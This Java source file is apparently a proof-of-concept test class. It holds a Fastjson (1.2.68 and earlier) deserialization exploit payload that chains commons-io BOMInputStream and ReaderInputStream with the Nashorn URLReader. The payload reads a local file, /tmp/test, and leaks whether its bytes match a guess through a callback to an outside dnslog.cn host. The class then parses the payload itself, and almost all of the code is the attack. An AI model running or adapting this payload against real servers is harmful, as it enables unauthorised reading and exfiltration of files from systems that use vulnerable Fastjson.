package test;

import java.io.InputStream;
import java.net.URL;
import java.util.Arrays;

import com.alibaba.fastjson.JSON;

public class Fastjson9_io_read_error_dnslog {
    public static void main(String[] args) throws Exception {
    	//<=1.2.68 and commons-io
    	String url = "file:///D:/";
    	InputStream input = new URL(url).openStream();
        byte[] bs = new byte[input.available()];
        input.read(bs);
        System.out.println(Arrays.toString(bs));
        System.out.println(new String(bs));
    	String payload = "{\r\n"
    			+ "      \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\r\n"
    			+ "        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
    			+ "        \"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
    			+ "          \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
    			+ "            \"url\": \"file:///tmp/test\"\r\n"
    			+ "          },\r\n"
    			+ "          \"charsetName\": \"UTF-8\",\r\n"
    			+ "          \"bufferSize\": 1024\r\n"
    			+ "        },\"boms\": [\r\n"
    			+ "          {\r\n"
    			+ "            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
    			+ "            \"charsetName\": \"UTF-8\",\r\n"
    			+ "            \"bytes\": [98]\r\n"
    			+ "          }\r\n"
    			+ "        ]\r\n"
    			+ "      },\r\n"
    			+ "      \"address\" : {\"@type\": \"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\r\n"
    			+ "                  \"charSequence\": {\"@type\": \"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"},\"start\": 0,\"end\": 0},\r\n"
    			+ "      \"xxx\": {\r\n"
    			+ "          \"@type\": \"java.lang.AutoCloseable\",\r\n"
    			+ "          \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
    			+ "          \"delegate\": {\r\n"
    			+ "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
    			+ "            \"reader\": {\r\n"
    			+ "              \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
    			+ "              \"url\": \"http://aaaxasd.g2pbiw.dnslog.cn/\"\r\n"
    			+ "              },\r\n"
    			+ "            \"charsetName\": \"UTF-8\",\r\n"
    			+ "            \"bufferSize\": 1024\r\n"
    			+ "          },\r\n"
    			+ "          \"boms\": [{\"@type\": \"org.apache.commons.io.ByteOrderMark\", \"charsetName\": \"UTF-8\", \"bytes\": [1]}]\r\n"
    			+ "      },\r\n"
    			+ "      \"zzz\":{\"$ref\":\"$.xxx.BOM[0]\"}\r\n"
    			+ "}\r\n"
    			+ "";
    	System.out.println(payload);
    	JSON.parseObject(payload);
    }
}
